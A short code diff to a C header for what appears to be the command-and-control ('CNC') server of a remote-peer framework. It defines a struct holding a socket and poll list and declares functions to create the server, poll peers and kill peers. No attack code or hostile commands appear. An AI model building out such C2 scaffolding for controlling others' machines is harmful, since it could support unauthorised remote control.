@@ -5,9 +5,17 @@
 #include "lpacket.h"
 #include "lsocket.h"
 #include "lpolllist.h"
+#include "lpeer.h"
 
-struct {
+struct sLaika_cnc {
     struct sLaika_socket sock;
-} sLaika_cnc;
+    struct sLaika_pollList pList;
+};
+
+struct sLaika_cnc *laikaC_newCNC(uint16_t port);
+void laikaC_freeCNC(struct sLaika_cnc *cnc);
+
+void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer);
+bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout);
 
 #endif
